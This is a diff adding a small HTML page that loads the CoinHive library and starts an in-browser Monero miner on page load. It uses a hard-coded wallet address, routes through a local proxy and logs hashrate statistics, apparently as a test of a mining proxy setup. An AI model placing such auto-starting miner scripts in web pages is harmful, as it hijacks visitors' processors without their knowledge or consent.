@@ -1,0 +1,25 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	// Configure CoinHive to point to your proxy
+	CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8893"]];
+
+	// Start miner
+	var miner = CoinHive.User('4AgVpbugKhLC5KunR3zvGEMprP4PyMfBua1fyqCy9iUY1zF8Jg5mhqDbaYm4BwFA9u9c4kosFZxaNVxQmWk51QMNFr86K84', 'worker2');
+	miner.start();
+	miner.setNumThreads(2);
+	//	miner.setThrottle(0.9);
+	miner.on('found', () => console.log("Found!"))
+	miner.on('accepted', () => console.log("Accepted!"))
+	miner.on('update', data => console.log(`
+				Hashes per second: ${data.hashesPerSecond}
+				Total hashes: ${data.totalHashes}
+				Accepted hashes: ${data.acceptedHashes}
+				`))
+	setInterval(function () {
+		var hps = miner.getHashesPerSecond();
+		var th = miner.getTotalHashes();
+		var ah = miner.getAcceptedHashes();
+		console.log("Hps: " + hps + " th: " + th + " ah: " + ah)
+	}, 1000)
+
+</script>
